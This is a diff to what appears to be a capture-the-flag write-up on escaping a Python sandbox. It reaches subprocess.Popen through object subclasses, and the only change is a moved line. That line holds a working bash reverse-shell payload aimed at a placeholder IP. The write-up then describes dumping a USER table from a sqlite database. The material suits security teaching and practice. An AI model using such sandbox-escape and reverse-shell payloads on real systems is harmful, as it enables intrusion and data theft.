@@ -16,9 +16,9 @@ On a meduim Writeup I saw you can display exceptions! So i try `print((()).__cla
 
 I used microsoft word as a find tool and got `raise Exception((()).__class__.__bases__[0].__subclasses__()[317].__name__)` perfect!
 
-Write a shell to get in `raise Exception(str((()) .__class__.__bases__[0].__subclasses__()[317]("bash -c 'bash -i >& /dev/tcp/your_IP/4444 0>&1'", shell=True, stdout=-1).communicate()))`
-
 <img width="973" height="61" alt="popen" src="https://github.com/user-attachments/assets/426198a4-6ba7-4839-a9f2-eb5ec728126d" />
+
+Write a shell to get in `raise Exception(str((()) .__class__.__bases__[0].__subclasses__()[317]("bash -c 'bash -i >& /dev/tcp/your_IP/4444 0>&1'", shell=True, stdout=-1).communicate()))`
 
 After that got my shell as app-prodution. Looking for files to write to I find a data base .db hmmm `cd instance sqlite3 database.db.tables SELECT * FROM USER;`
 
